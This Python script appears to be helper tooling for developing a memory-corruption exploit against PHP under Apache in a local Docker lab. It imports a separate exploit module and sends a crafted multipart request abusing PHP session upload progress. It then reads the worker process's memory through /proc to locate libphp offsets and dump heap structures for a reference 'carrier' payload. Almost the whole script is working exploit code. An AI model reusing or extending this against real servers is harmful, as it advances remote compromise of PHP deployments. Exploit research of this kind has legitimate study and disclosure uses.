import os
import subprocess, time, struct, os, importlib.util

BASE = os.path.dirname(os.path.abspath(__file__))
c = "p2s8234"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

spec = importlib.util.spec_from_file_location("exploit", os.path.join(BASE, "exploit.py"))
em = importlib.util.module_from_spec(spec); spec.loader.exec_module(em)
Target, build_multipart, SID, MAX_CMD = em.Target, em.build_multipart, em.SID, em.MAX_CMD

def get_worker():
    r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    pid = pids[-1]
    r = sh(f'docker exec {c} sh -c "grep libphp /proc/{pid}/maps 2>/dev/null | head -1"')
    B = int(r.stdout.strip().split("-")[0], 16)
    return pid, B

def read_mem(pid, addr, size):
    r = subprocess.run(
        f'docker exec {c} sh -c "dd if=/proc/{pid}/mem bs=1 skip={addr} count={size} 2>/dev/null"',
        shell=True, capture_output=True)
    return r.stdout

pid, B = get_worker()
ps_base = B + 0xf3a120
ps_hsv = ps_base + 0x140
print(f"[*] worker={pid} libphp=0x{B:x} ps_hsv=0x{ps_hsv:x}", flush=True)

target = Target("http://127.0.0.1:18111/index.php", timeout=120, verbose=False)
pads = [(31, 31)] * 6
parts_a = [
    {"name": "PHPSESSID", "data": b"a" * 19},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
]
for i, (nl, vl) in enumerate(pads):
    name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
    parts_a.append({"name": name, "data": b"V" * vl})
parts_a.append({"name": "f", "filename": "a.txt", "data": b"A" * 64})
parts_a.append({"name": "big", "data": b"B" * (12 * 1024 * 1024)})
body_a = build_multipart(parts_a, b"S" * 17)
target.post(body_a, b"S" * 17, read_cap=1 << 20, timeout=120,
             extra_headers={"Cookie": "PHPSESSID=" + "a" * 32})
time.sleep(0.5)

data = read_mem(pid, ps_hsv, 16)
R = struct.unpack("<Q", data[:8])[0] if len(data) >= 8 else 0
tinfo = struct.unpack("<I", data[8:12])[0] if len(data) >= 12 else 0
print(f"[+] R=0x{R:x} type_info=0x{tinfo:04x}", flush=True)
if R == 0:
    print("[!] R is 0"); raise SystemExit

# Dump heap from R to R+0x1000 (4KB), 0x40-byte lines, annotate
print(f"\n=== heap [R .. R+0x1000) ===", flush=True)
def classify(w, B):
    if w == 0: return "zero"
    if 0x700000000000 < w < 0x800000000000:
        return f"libphp+{w-B:#x}" if B <= w < B + 0x2000000 else "heap?"
    if w in (1,2,3,7,0x1A,0x10,0x106,0x307,15,31,48,167,0x1000,0x28):
        return f"small:{w}"
    return ""

line = []
for off in range(0, 0x1000, 8):
    d = read_mem(pid, R + off, 8)
    if len(d) < 8: line.append("--------"); continue
    w = struct.unpack("<Q", d)[0]
    mark = classify(w, B)
    # detect if this looks like a zend_string header: next 8 bytes = len (small), etc
    line.append(f"{w:016x}{(' '+mark) if mark else ''}")
    if (off // 8) % 8 == 7:
        print(f"  +{off-0x40+8:04x}: " + " ".join(line), flush=True); line = []
if line:
    print(f"  +{0x1000-8:04x}: " + " ".join(line), flush=True)

# Also locate the 15-byte carrier and the reference R within the dump
carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", (0x5a3f60000000 + 0x690d8))[:7]
# search for the IS_REFERENCE reference pattern (rc=2, type~0x1a)
print(f"\n=== scan for reference pattern (rc=2,type=0x1a) and carrier in [R-0x200000, R+0x200000] ===", flush=True)
# We know carrier ~R+0xfd8; confirm and find the reference R's own bytes
ref = read_mem(pid, R, 16)
print(f"  ref@R: {ref.hex() if len(ref)>=16 else 'n/a'}", flush=True)
print(f"[*] Done.", flush=True)
